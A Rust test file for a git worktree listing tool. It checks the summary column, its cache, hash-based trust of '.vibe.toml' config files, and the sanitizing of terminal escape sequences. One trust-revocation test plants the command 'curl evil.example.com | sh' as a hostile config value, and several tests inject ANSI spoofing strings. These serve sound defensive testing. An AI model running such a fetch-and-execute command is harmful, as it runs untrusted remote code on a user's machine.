    // What it guarantees: `head` uses the same null-for-unknown semantics as
    // every other enrichment field. A pre-2.36 git's plain porcelain — and the
    // hand-written fixtures — can omit the `HEAD` record entirely, and a
    // consumer must not have to treat `""` as a second kind of unknown.
    let io = no_home();
    let mut git = ListGit::with(&[("/repo/main", "main")]);
    // The plain porcelain shape with no `HEAD` record at all.
    git.porcelain = "worktree /repo/main\nbranch refs/heads/main\n\n".to_string();
    run(&io, &git, "/repo/main", true).unwrap();

    let parsed: serde_json::Value = serde_json::from_str(&io.stderr_text()).unwrap();
    assert_eq!(parsed[0]["head"], serde_json::Value::Null);
}

// --- the SUMMARY column ---------------------------------------------------

/// A repository whose main worktree is a REAL directory, so `.vibe.toml` can be
/// written and trusted the way a user's is.
///
/// The trust gate reads the file from disk and compares its SHA-256 against the
/// settings store, so a fake path would never be trusted and every summary test
/// would exercise only the error branch.
struct SummaryFixture {
    fx: vibe_test_support::Fixture,
    main_path: String,
    io: FakeIo,
    resolver: MapResolver,
}

/// How the fixture's `.vibe.toml` is registered in the trust store.
#[derive(Clone, Copy, PartialEq)]
enum Trust {
    /// Not registered at all.
    No,
    /// Registered with the file's real hash.
    Yes,
    /// Registered with `skipHashCheck`, the documented escape hatch — which
    /// makes the trust loader emit a warning on EVERY run.
    SkipHashCheck,
}

impl SummaryFixture {
    /// Write `.vibe.toml` with `toml` under a fresh main worktree and trust it.
    fn trusted(toml: &str) -> Self {
        SummaryFixture::build(toml, Trust::Yes)
    }

    /// Same, but the file is NOT registered in the trust store.
    fn untrusted(toml: &str) -> Self {
        SummaryFixture::build(toml, Trust::No)
    }

    /// Same, but trusted via `skipHashCheck`.
    fn trusted_with_skip_hash_check(toml: &str) -> Self {
        SummaryFixture::build(toml, Trust::SkipHashCheck)
    }

    fn build(toml: &str, trust: Trust) -> Self {
        use crate::hash::hash_content;
        use crate::settings::{AllowEntry, RepoId, VibeSettings};
        use crate::settings_io::save_user_settings;

        let fx = vibe_test_support::Fixture::new();
        // HOME doubles as the settings store AND the cache root, exactly as it
        // does in production.
        let io = FakeIo::new().with_env("HOME", fx.path().to_str().unwrap());
        let main = fx.mkdir("repo");
        let main_path = main.to_string_lossy().into_owned();
        let file_path = fx.write("repo/.vibe.toml", toml);

        let mut settings = VibeSettings::default_settings();
        if trust != Trust::No {
            let skipping = trust == Trust::SkipHashCheck;
            settings.permissions.allow.push(AllowEntry {
                repo_id: RepoId {
                    remote_url: None,
                    repo_root: Some(main_path.clone()),
                },
                relative_path: ".vibe.toml".into(),
                // With the hash check skipped the stored hash is never
                // consulted, so leaving it empty is what a real
                // `skipHashCheck` entry looks like.
                hashes: if skipping {
                    vec![]
                } else {
                    vec![hash_content(toml.as_bytes())]
                },
                skip_hash_check: skipping.then_some(true),
            });
        }
        save_user_settings(&io, &settings, V).unwrap();

        let mut repos = StdHashMap::new();
        repos.insert(
            file_path.to_string_lossy().into_owned(),
            RepoInfo {
                remote_url: None,
                repo_root: main_path.clone(),
                relative_path: ".vibe.toml".into(),
            },
        );

        SummaryFixture {
            fx,
            main_path,
            io,
            resolver: MapResolver { repos },
        }
    }

    /// The absolute path of the fixture's `.vibe.toml`.
    fn config_path(&self) -> String {
        self.fx
            .path()
            .join("repo/.vibe.toml")
            .to_string_lossy()
            .into_owned()
    }

    /// A git whose main worktree is this fixture's real directory, plus any
    /// extra `(path, branch)` worktrees.
    fn git(&self, extra: &[(&str, &str)]) -> ListGit {
        let mut entries: Vec<(&str, &str)> = vec![(self.main_path.as_str(), "main")];
        entries.extend_from_slice(extra);
        ListGit::with(&entries)
    }

    fn run<S: SummaryRunner>(&self, git: &ListGit, runner: &S, json: bool) -> Result<Outcome> {
        run_with(
            &self.io,
            git,
            &self.resolver,
            runner,
            &self.main_path,
            json,
            OutputOptions::default(),
        )
    }
}

const SUMMARY_TOML: &str = "[summary]\ncommand = \"./summarize.sh\"\n";

/// What it guarantees: without `[summary]` the table and the JSON are exactly
/// what they were before the feature existed, and nothing is ever spawned.
#[test]
fn without_a_summary_config_the_column_is_absent_and_nothing_runs() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main")]);
    let runner = FakeSummaryRunner::with_stdout(r#"{"main":"never asked"}"#);
    run_with(
        &io,
        &git,
        &MapResolver::default(),
        &runner,
        "/repo/main",
        true,
        OutputOptions::default(),
    )
    .unwrap();

    assert_eq!(runner.calls().len(), 0);
    let parsed: serde_json::Value = serde_json::from_str(&io.stderr_text()).unwrap();
    assert!(
        parsed[0].as_object().unwrap().get("summary").is_none(),
        "the field must not appear when the feature is off: {parsed}"
    );
}

#[test]
fn a_configured_summary_appears_in_the_table_and_the_json() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let git = fixture.git(&[]);
    let runner = FakeSummaryRunner::with_stdout(r#"{"main":"the trunk branch"}"#);
    fixture.run(&git, &runner, false).unwrap();
    assert!(
        fixture.io.stderr_text().contains("the trunk branch"),
        "got: {}",
        fixture.io.stderr_text()
    );

    let json_fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let json_git = json_fixture.git(&[]);
    let json_runner = FakeSummaryRunner::with_stdout(r#"{"main":"the trunk branch"}"#);
    json_fixture.run(&json_git, &json_runner, true).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&json_fixture.io.stderr_text()).unwrap();
    assert_eq!(parsed[0]["summary"], "the trunk branch");
}

/// What it guarantees: the column's presence follows the CONFIG, so a worktree
/// the command stayed silent about still carries the field (empty) rather than
/// making the reader wonder whether the feature is on.
#[test]
fn a_configured_summary_gives_every_row_the_field_even_when_unanswered() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let git = fixture.git(&[]);
    let runner = FakeSummaryRunner::with_stdout("{}");
    fixture.run(&git, &runner, true).unwrap();

    let parsed: serde_json::Value = serde_json::from_str(&fixture.io.stderr_text()).unwrap();
    assert_eq!(parsed[0]["summary"], "");
}

/// What it guarantees: the second `vibe list` over an unchanged repository does
/// not pay for the command again.
#[test]
fn a_second_listing_of_an_unchanged_repository_does_not_run_the_command() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let git = fixture.git(&[]);

    let first = FakeSummaryRunner::with_stdout(r#"{"main":"cached answer"}"#);
    fixture.run(&git, &first, false).unwrap();
    assert_eq!(first.calls().len(), 1);

    let second = FakeSummaryRunner::with_stdout(r#"{"main":"should not be asked"}"#);
    fixture.run(&git, &second, false).unwrap();
    assert_eq!(second.calls().len(), 0, "the cache must have answered");
    assert!(fixture.io.stderr_text().contains("cached answer"));
}

/// What it guarantees: control characters from an EXTERNAL command cannot reach
/// the terminal, exactly as they cannot from a branch name.
#[test]
fn control_characters_in_a_summary_are_neutralized() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let git = fixture.git(&[]);
    // JSON-escaped, which is how a real command emits a control character:
    // a raw one inside a JSON string is invalid JSON, so the escape is the only
    // way an attacker-controlled summary can carry it this far.
    let runner = FakeSummaryRunner::with_stdout(r#"{"main":"spoof\u001b[2Kgone"}"#);
    fixture.run(&git, &runner, false).unwrap();

    let text = fixture.io.stderr_text();
    assert!(
        !text.contains('\u{1b}'),
        "escape reached the terminal: {text}"
    );
    assert!(text.contains('\u{fffd}'));
}

/// What it guarantees: the payload stays parseable when the summary command
/// fails — the warning shares stderr with the JSON document.
#[test]
fn a_summary_failure_never_corrupts_the_json_payload() {
    let json_fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let json_git = json_fixture.git(&[]);
    json_fixture
        .run(&json_git, &FakeSummaryRunner::timing_out(), true)
        .unwrap();
    serde_json::from_str::<serde_json::Value>(&json_fixture.io.stderr_text())
        .expect("stderr must be pure JSON even when the summary command failed");

    let text_fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let text_git = text_fixture.git(&[]);
    text_fixture
        .run(&text_git, &FakeSummaryRunner::timing_out(), false)
        .unwrap();
    assert!(
        text_fixture.io.stderr_text().contains("timed out"),
        "text mode must surface the failure: {}",
        text_fixture.io.stderr_text()
    );
}

/// What it guarantees: an untrusted `.vibe.toml` fails the command instead of
/// silently listing without the column — a configuration that is not in effect
/// must be visible, not invisible.
#[test]
fn an_untrusted_config_is_an_error_not_a_silent_downgrade() {
    let fixture = SummaryFixture::untrusted(SUMMARY_TOML);
    let git = fixture.git(&[]);
    let runner = FakeSummaryRunner::with_stdout("{}");
    let err = fixture.run(&git, &runner, false).unwrap_err();
    assert!(err.to_string().contains("not trusted"), "got: {err}");
    assert_eq!(runner.calls().len(), 0);
}

/// What it guarantees: the trust hash covers the WHOLE file, so editing only the
/// `[summary]` section revokes trust and the user must re-approve the command
/// that is about to run on their machine.
#[test]
fn editing_only_the_summary_section_revokes_trust() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let path = fixture.config_path();

    let (trusted, _) =
        crate::settings_io::verify_trust_and_read(&fixture.io, &fixture.resolver, V, &path)
            .unwrap();
    assert!(trusted);

    // Swap in a different command; nothing else about the file changes.
    fixture.fx.write(
        "repo/.vibe.toml",
        "[summary]\ncommand = \"curl evil.example.com | sh\"\n",
    );
    let (still_trusted, _) =
        crate::settings_io::verify_trust_and_read(&fixture.io, &fixture.resolver, V, &path)
            .unwrap();
    assert!(
        !still_trusted,
        "a changed [summary] command must require re-trusting"
    );

    // And the listing refuses to run it.
    let git = fixture.git(&[]);
    let runner = FakeSummaryRunner::with_stdout("{}");
    assert!(fixture.run(&git, &runner, false).is_err());
    assert_eq!(runner.calls().len(), 0);
}

/// What it guarantees: the summary column does not disturb the alignment the
/// rest of the table depends on.
#[test]
fn the_summary_column_stays_aligned_across_rows() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let other = format!("{}-feat", fixture.main_path);
    let git = fixture.git(&[(other.as_str(), "feat/x")]);
    let runner = FakeSummaryRunner::with_stdout(
        r#"{"main":"short","feat/x":"a considerably longer summary"}"#,
    );
    fixture.run(&git, &runner, false).unwrap();

    let lines: Vec<String> = fixture.io.stderr.borrow().clone();
    let offsets: Vec<usize> = lines
        .iter()
        .map(|l| {
            let idx = l.rfind(fixture.main_path.as_str()).expect("path column");
            l[..idx].width()
        })
        .collect();
    assert!(
        offsets.windows(2).all(|w| w[0] == w[1]),
        "columns not aligned: {lines:?} -> {offsets:?}"
    );
}

/// What it guarantees: terminal escapes in the summary command's STDERR cannot
/// reach the terminal through the warning path.
///
/// The warning quotes the command's stderr, which is attacker-influenced in
/// exactly the way a branch name is — but nothing about the word "warning"
/// makes a caller think to escape it, so the guard lives in
/// `DeferredWarnings::push` and this test pins it there.
#[test]
fn control_characters_in_a_failing_commands_stderr_are_neutralized() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let git = fixture.git(&[]);
    let runner = FakeSummaryRunner::failing(1, "boom \u{1b}[2K\u{1b}[1;31mSPOOFED");
    fixture.run(&git, &runner, false).unwrap();

    let text = fixture.io.stderr_text();
    assert!(
        !text.contains('\u{1b}'),
        "escape reached the terminal: {text:?}"
    );
    // The warning is still shown — neutralized, not dropped.
    assert!(text.contains("boom"), "got: {text}");
    assert!(text.contains('\u{fffd}'));
}

/// What it guarantees: the same holds for a git error reaching a warning, which
/// is the other string the enrichment path interpolates verbatim.
#[test]
fn control_characters_in_a_worktree_path_warning_are_neutralized() {
    let io = no_home();
    let git = ListGit::with(&[("/repo/main", "main"), ("/repo/spoof\u{1b}[2K", "feat/x")])
        .with_failing_status("/repo/spoof\u{1b}[2K");
    run(&io, &git, "/repo/main", false).unwrap();

    let text = io.stderr_text();
    assert!(
        !text.contains('\u{1b}'),
        "escape reached the terminal: {text:?}"
    );
    assert!(text.contains("Could not read status"), "got: {text}");
}

/// What it guarantees: `--verbose --json` stays parseable even when the summary
/// path has something to say.
///
/// The duplicate-name notice is written with `verbose_log` from inside the
/// summary orchestrator, which has no idea the caller is in JSON mode. The fix
/// is structural — the whole summary path runs against a capturing `Io` — so
/// this pins the OUTCOME rather than the mechanism.
#[test]
fn a_verbose_json_run_stays_pure_json_when_summaries_are_skipped() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
    // Two detached worktrees under directories with the same basename: the
    // summary protocol keys answers by name, so both are skipped with a notice.
    let dup_a = format!("{}-x/dup", fixture.main_path);
    let dup_b = format!("{}-y/dup", fixture.main_path);
    let mut git = ListGit::with_optional_branches(&[
        (fixture.main_path.as_str(), Some("main")),
        (dup_a.as_str(), None),
        (dup_b.as_str(), None),
    ]);
    git.detached_log = Some((NOW_SECS - 60, "iso".to_string()));

    let runner = FakeSummaryRunner::with_stdout(r#"{"main":"m"}"#);
    run_with(
        &fixture.io,
        &git,
        &fixture.resolver,
        &runner,
        &fixture.main_path,
        true,
        OutputOptions::new(true, false),
    )
    .unwrap();

    let text = fixture.io.stderr_text();
    assert!(!text.contains("[verbose]"), "diagnostic leaked: {text}");
    serde_json::from_str::<serde_json::Value>(&text)
        .expect("stderr must be pure JSON under --verbose --json");
}

/// What it guarantees: the same notice IS still shown in text mode — the fix
/// defers the message, it does not discard it.
#[test]
fn the_skipped_summary_notice_still_appears_in_verbose_text_mode() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let dup_a = format!("{}-x/dup", fixture.main_path);
    let dup_b = format!("{}-y/dup", fixture.main_path);
    let mut git = ListGit::with_optional_branches(&[
        (fixture.main_path.as_str(), Some("main")),
        (dup_a.as_str(), None),
        (dup_b.as_str(), None),
    ]);
    git.detached_log = Some((NOW_SECS - 60, "iso".to_string()));

    let runner = FakeSummaryRunner::with_stdout(r#"{"main":"m"}"#);
    run_with(
        &fixture.io,
        &git,
        &fixture.resolver,
        &runner,
        &fixture.main_path,
        false,
        OutputOptions::new(true, false),
    )
    .unwrap();

    assert!(
        fixture.io.stderr_text().contains("Skipping summary"),
        "got: {}",
        fixture.io.stderr_text()
    );
}

/// What it guarantees: a warning emitted by the TRUST loader — which knows
/// nothing about `list`'s output mode — cannot corrupt the JSON payload.
///
/// `skipHashCheck` is the documented escape hatch, and `verify_trust_and_read`
/// warns on every run that uses it. Before the capturing `Io`, that line was
/// printed straight to stderr in front of the document:
///
/// ```text
/// Warning: Hash verification is disabled for /…/.vibe.toml
/// [ { "branch": "main", …
/// ```
#[test]
fn a_skip_hash_check_warning_never_corrupts_the_json_payload() {
    let fixture = SummaryFixture::trusted_with_skip_hash_check(SUMMARY_TOML);
    let git = fixture.git(&[]);
    let runner = FakeSummaryRunner::with_stdout(r#"{"main":"m"}"#);
    fixture.run(&git, &runner, true).unwrap();

    let text = fixture.io.stderr_text();
    serde_json::from_str::<serde_json::Value>(&text)
        .expect("stderr must be pure JSON despite the trust-loader warning");

    // Text mode still surfaces it, deferred rather than dropped.
    let text_fixture = SummaryFixture::trusted_with_skip_hash_check(SUMMARY_TOML);
    let text_git = text_fixture.git(&[]);
    let text_runner = FakeSummaryRunner::with_stdout(r#"{"main":"m"}"#);
    text_fixture.run(&text_git, &text_runner, false).unwrap();
    assert!(
        text_fixture
            .io
            .stderr_text()
            .contains("Hash verification is disabled"),
        "got: {}",
        text_fixture.io.stderr_text()
    );
}

/// What it guarantees: renaming a branch re-asks for its summary.
///
/// End-to-end over `list`, not just over `entry_key`: the row's `name` has to
/// actually reach the key for the invalidation to happen.
#[test]
fn renaming_a_branch_makes_the_summary_a_cache_miss() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);

    let first = FakeSummaryRunner::with_stdout(r#"{"main":"before the rename"}"#);
    fixture.run(&fixture.git(&[]), &first, false).unwrap();
    assert_eq!(first.calls().len(), 1);

    // Same path, same HEAD, same clean tree — only the branch name differs.
    let renamed = ListGit::with(&[(fixture.main_path.as_str(), "trunk")]);
    let second = FakeSummaryRunner::with_stdout(r#"{"trunk":"after the rename"}"#);
    fixture.run(&renamed, &second, false).unwrap();

    assert_eq!(second.calls().len(), 1, "a rename must re-ask");
    assert!(
        fixture.io.stderr_text().contains("after the rename"),
        "got: {}",
        fixture.io.stderr_text()
    );
}

/// What it guarantees: a warning collected before an error is still shown.
///
/// The `skipHashCheck` notice is emitted by the trust loader, captured, and then
/// the run fails because a SECOND config file is untrusted. Deferral exists to
/// protect the `--json` payload, and an error path produces no payload — so
/// withholding here would simply discard the warning, which is frequently the
/// explanation for the error that follows.
#[test]
fn warnings_captured_before_an_error_are_still_flushed() {
    let fixture = SummaryFixture::trusted_with_skip_hash_check(SUMMARY_TOML);
    // A second config file that is NOT in the trust store: loading it fails
    // AFTER the first file's warning has already been captured.
    fixture
        .fx
        .write("repo/.vibe.local.toml", "[summary]\ncommand = \"./x.sh\"\n");

    let git = fixture.git(&[]);
    let runner = FakeSummaryRunner::with_stdout("{}");
    let err = fixture.run(&git, &runner, false).unwrap_err();
    assert!(err.to_string().contains("not trusted"), "got: {err}");

    assert!(
        fixture
            .io
            .stderr_text()
            .contains("Hash verification is disabled"),
        "the captured warning must survive the error: {:?}",
        fixture.io.stderr_text()
    );
}

/// What it guarantees: a captured warning carries no ANSI escapes, so the
/// sanitize-then-recolor sequence cannot render `<ESC>[33m` as literal text.
///
/// On a TTY, `warn_log` colors its message. A callee writing through the capture
/// would embed real escapes in the buffered string; `DeferredWarnings::push`
/// then neutralizes them to `\u{fffd}` and the flush colors the result again, so
/// the user sees a mangled `?[33m` in the middle of the warning. Capturing the
/// PLAIN message and coloring once at flush is the only ordering that works.
#[test]
fn captured_warnings_are_colorless_so_sanitizing_cannot_mangle_them() {
    let fixture = SummaryFixture::trusted_with_skip_hash_check(SUMMARY_TOML);
    // A terminal, which is what makes `warn_log` colorize at all.
    let tty_io = FakeIo::new()
        .with_env("HOME", fixture.fx.path().to_str().unwrap())
        .stderr_tty(true);

    let git = fixture.git(&[]);
    let runner = FakeSummaryRunner::with_stdout(r#"{"main":"m"}"#);
    run_with(
        &tty_io,
        &git,
        &fixture.resolver,
        &runner,
        &fixture.main_path,
        false,
        OutputOptions::default(),
    )
    .unwrap();

    let text = tty_io.stderr_text();
    let warning = text
        .lines()
        .find(|l| l.contains("Hash verification is disabled"))
        .expect("the trust warning is shown");
    // The replacement character is the tell-tale of a mangled escape.
    assert!(
        !warning.contains('\u{fffd}'),
        "an escape was sanitized inside the captured message: {warning:?}"
    );
    // Exactly one color wrap, applied at flush: opening and closing sequence.
    assert!(warning.starts_with("\u{1b}[33m"), "got: {warning:?}");
    assert_eq!(
        warning.matches('\u{1b}').count(),
        2,
        "expected one colorize, got: {warning:?}"
    );
}

/// What it guarantees: `FORCE_COLOR` cannot put the escapes back either — it
/// overrides the tty check inside `is_color_enabled`, so the capture has to mask
/// it as well as report a non-tty.
#[test]
fn force_color_does_not_reintroduce_escapes_into_captured_warnings() {
    let fixture = SummaryFixture::trusted_with_skip_hash_check(SUMMARY_TOML);
    let io = FakeIo::new()
        .with_env("HOME", fixture.fx.path().to_str().unwrap())
        .with_env("FORCE_COLOR", "1");

    let git = fixture.git(&[]);
    let runner = FakeSummaryRunner::with_stdout(r#"{"main":"m"}"#);
    run_with(
        &io,
        &git,
        &fixture.resolver,
        &runner,
        &fixture.main_path,
        false,
        OutputOptions::default(),
    )
    .unwrap();

    let warning = io
        .stderr_text()
        .lines()
        .find(|l| l.contains("Hash verification is disabled"))
        .expect("the trust warning is shown")
        .to_string();
    assert!(!warning.contains('\u{fffd}'), "got: {warning:?}");
    assert_eq!(warning.matches('\u{1b}').count(), 2, "got: {warning:?}");
}

/// What it guarantees: a run whose batched ref lookup failed neither trusts nor
/// writes the summary cache.
///
/// A failed `git for-each-ref` returns an empty map, which is indistinguishable
/// from "no branch has an upstream" — so BASE falls back to the default branch
/// for every row. That guess frequently reproduces the base a branch USED to
/// have, so the key matches an entry describing a different upstream and the
/// stale summary is shown with nothing to signal the degradation.
#[test]
fn a_failed_ref_lookup_neither_hits_nor_writes_the_cache() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);

    // A healthy run: `main` has no upstream, so BASE is the default branch and
    // the summary is cached against it.
    let healthy = fixture.git(&[]).with_ref("main", 60, None);
    let first = FakeSummaryRunner::with_stdout(r#"{"main":"cached while healthy"}"#);
    fixture.run(&healthy, &first, false).unwrap();
    assert_eq!(first.calls().len(), 1);

    // Same repository, but `for-each-ref` now fails outright. BASE degrades to
    // the very same default branch, so the key is byte-identical — only the
    // degradation flag can prevent the hit.
    let mut degraded = fixture.git(&[]);
    degraded.fail_for_each_ref = true;
    let second = FakeSummaryRunner::with_stdout(r#"{"main":"asked again"}"#);
    let result = fixture.run(&degraded, &second, false).unwrap();
    assert_eq!(result, Outcome::none());
    assert_eq!(
        second.calls().len(),
        1,
        "a degraded run must not trust the cache"
    );

    // Nor may it write: the entry it would store is keyed on a guessed base.
    let cache = crate::summary::load_cache(
        &fixture.io,
        &fixture.main_path,
        &crate::summary::command_hash("./summarize.sh"),
    )
    .cache;
    assert_eq!(
        cache.get_stale(&fixture.main_path),
        Some("cached while healthy"),
        "the degraded answer must not overwrite the healthy entry"
    );
}

/// What it guarantees: the opt-out is scoped to the degradation. Once the ref
/// lookup succeeds again, the cache is used normally.
#[test]
fn a_recovered_ref_lookup_uses_the_cache_again() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let healthy = fixture.git(&[]).with_ref("main", 60, None);

    let first = FakeSummaryRunner::with_stdout(r#"{"main":"cached"}"#);
    fixture.run(&healthy, &first, false).unwrap();
    assert_eq!(first.calls().len(), 1);

    let healthy_again = fixture.git(&[]).with_ref("main", 60, None);
    let second = FakeSummaryRunner::with_stdout(r#"{"main":"should not be asked"}"#);
    fixture.run(&healthy_again, &second, false).unwrap();
    assert_eq!(second.calls().len(), 0, "a healthy run must hit the cache");
}

/// What it guarantees: a detached row is unaffected. Its base is `None` by
/// construction on every run, degraded or not, so its key never moves and
/// excluding it would cost a spawn for no benefit.
#[test]
fn a_failed_ref_lookup_does_not_disturb_a_detached_row() {
    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
    let detached = format!("{}-det", fixture.main_path);

    let mut git = ListGit::with_optional_branches(&[
        (fixture.main_path.as_str(), Some("main")),
        (detached.as_str(), None),
    ]);
    git.detached_log = Some((NOW_SECS - 60, "iso".to_string()));

    // The detached row's name is its directory BASENAME, which is what the
    // command must answer under for it to be cached at all.
    let det_name = std::path::Path::new(&detached)
        .file_name()
        .unwrap()
        .to_string_lossy()
        .into_owned();
    let first = FakeSummaryRunner::with_stdout(&format!(r#"{{"main":"m","{det_name}":"d"}}"#));
    fixture.run(&git, &first, false).unwrap();

    // Now the ref lookup fails. The branch row re-asks; the detached row does
    // not have to, so it is answered from the cache.
    let mut degraded = ListGit::with_optional_branches(&[
        (fixture.main_path.as_str(), Some("main")),
        (detached.as_str(), None),
    ]);
    degraded.detached_log = Some((NOW_SECS - 60, "iso".to_string()));
    degraded.fail_for_each_ref = true;

    let second = FakeSummaryRunner::with_stdout(r#"{"main":"m2"}"#);
    let payload_names = {
        fixture.run(&degraded, &second, false).unwrap();
        let payload: serde_json::Value =
            serde_json::from_str(&second.calls()[0].stdin_payload).unwrap();
        payload["worktrees"]
            .as_array()
            .unwrap()
            .iter()
            .map(|w| w["name"].as_str().unwrap().to_string())
            .collect::<Vec<_>>()
    };
    assert_eq!(
        payload_names,
        vec!["main"],
        "only the branch row degrades; the detached row stays cached"
    );
}
